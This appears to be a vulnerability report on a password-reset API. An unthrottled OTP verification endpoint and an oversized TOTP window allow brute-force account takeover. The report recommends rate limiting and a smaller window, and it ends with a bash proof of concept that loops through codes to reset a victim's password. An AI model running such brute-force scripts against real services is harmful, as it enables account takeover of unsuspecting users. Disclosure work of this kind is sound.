### Title
Missing Rate Limiting on OTP Verification Endpoint Combined with Oversized TOTP Window Enables Brute-Force Account Takeover

### Summary
The password-reset OTP verification endpoint (`POST /verify-reset`) has no rate-limiting guard, while every other sensitive auth endpoint (`/login`, `/reset-password`, `/signup`) is protected by `EmailThrottlerGuard`. Simultaneously, the TOTP configuration sets `window: 20` with `step: 60`, making 41 different 8-digit codes simultaneously valid at any moment. An attacker who triggers a password reset for a victim (receiving the OTP JWT in the response) can brute-force the OTP code against the unthrottled endpoint, ultimately taking over the account.

### Finding Description

**Root Cause 1 — Oversized TOTP window:**

In `auth.service.ts`, the global TOTP options are:

```typescript
totp.options = {
  digits: 8,
  step: 60,
  window: 20,
};
``` [1](#0-0) 

`window: 20` instructs `otplib` to accept any code from `currentStep - 20` to `currentStep + 20`. With `step: 60 s`, this means **41 distinct 8-digit codes are simultaneously valid** at any point in time, instead of the library default of 3 (window=1). This reduces the effective search space from 10^8 to ~10^8/41 ≈ 2.4 million guesses needed on average.

**Root Cause 2 — No rate limiting on `/verify-reset`:**

The auth controller applies `EmailThrottlerGuard` to `/signup`, `/login`, and `/reset-password`, but the `/verify-reset` endpoint carries only `JwtBlackListOtpGuard` and `OtpJwtAuthGuard`:

```typescript
@Post('/verify-reset')
@HttpCode(200)
@UseGuards(JwtBlackListOtpGuard, OtpJwtAuthGuard)
async verifyOtp(@GetUser() user: User, @Body() dto: OtpDto, @Req() req) {
``` [2](#0-1)

**Exploit flow:**

1. Attacker calls `POST /reset-password` with victim's email. The response body contains the OTP JWT (`token`). The OTP code is emailed to the victim. [5](#0-4) 

2. Attacker uses the returned OTP JWT as the `otp` header and iterates through 8-digit codes against `POST /verify-reset`. No throttle guard is present to stop this.

3. With `window: 20`, 41 codes are valid simultaneously. At a modest 1 000 req/s, the expected number of attempts to hit a valid code is ~2.4 million, taking ~40 minutes — well within a typical `OTP_EXPIRATION` window.

4. On a successful guess, the server returns a `verified: true` OTP JWT and blacklists the old one: [6](#0-5) 

5. Attacker calls `PATCH /set-password` with the verified JWT to set an arbitrary password, completing the account takeover. [7](#0-6) 

### Impact Explanation
Full account takeover for any user whose email address is known. Once the attacker controls the account, they can access all organization transactions, approve or cancel multi-signature workflows, and exfiltrate any data visible to that user. Admin accounts are equally vulnerable, which could grant access to user management and deployment infrastructure.

### Likelihood Explanation
The attacker preconditions are minimal: only the victim's email is required, which is often discoverable (e.g., from the organization's user list if the attacker has any valid account, or from public sources). The attack requires no privileged access, no leaked secrets, and no cryptographic break. The absence of rate limiting on `/verify-reset` means the attack can be executed with a simple HTTP loop. The large TOTP window (window=20) meaningfully reduces the search space and increases success probability per unit time.

### Recommendation

1. **Add `EmailThrottlerGuard` (or `IpThrottlerGuard`) to `/verify-reset`**, consistent with all other sensitive auth endpoints. [2](#0-1) 

2. **Reduce the TOTP window** from `20` to `1` (the `otplib` default), which limits valid codes to 3 at any moment (previous, current, next step). The current value of 20 provides no user-experience benefit and dramatically weakens security. [1](#0-0) 

3. **Implement attempt counting per OTP JWT** (e.g., store attempt count in Redis keyed by JTI) and invalidate the JWT after N failed attempts (e.g., 5), forcing the user to request a new OTP.

### Proof of Concept

```bash
# Step 1: Trigger password reset — attacker receives OTP JWT in response body
OTP_JWT=$(curl -s -X POST https://api.example.com/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' | jq -r '.token')

# Step 2: Brute-force /verify-reset — no rate limiting, 41 valid codes at any time
for code in $(seq -w 00000000 99999999); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    https://api.example.com/auth/verify-reset \
    -H "Content-Type: application/json" \
    -H "otp: $OTP_JWT" \
    -d "{\"token\":\"$code\"}")
  if [ "$STATUS" = "200" ]; then
    echo "Valid OTP found: $code"
    break
  fi
done

# Step 3: Use verified JWT to set attacker-controlled password
curl -X PATCH https://api.example.com/auth/set-password \
  -H "Content-Type: application/json" \
  -H "otp: $VERIFIED_JWT" \
  -d '{"password":"attacker_password"}'
```

Expected outcome: the loop terminates with a valid OTP code (on average after ~2.4 million iterations with no server-side blocking), and the attacker successfully resets the victim's password.

  async verifyOtp(user: User, { token }: OtpDto): Promise<{ token: string }> {
    const secret = this.getOtpSecret(user.email);

    if (!totp.check(token, secret)) throw new UnauthorizedException('Incorrect token');

    try {
      await this.usersService.updateUser(user, { status: UserStatus.NEW });
      const token = this.getOtpToken({ email: user.email, verified: true });
      return { token };
    } catch {
      throw new InternalServerErrorException('Error while updating user status');
    }
  }
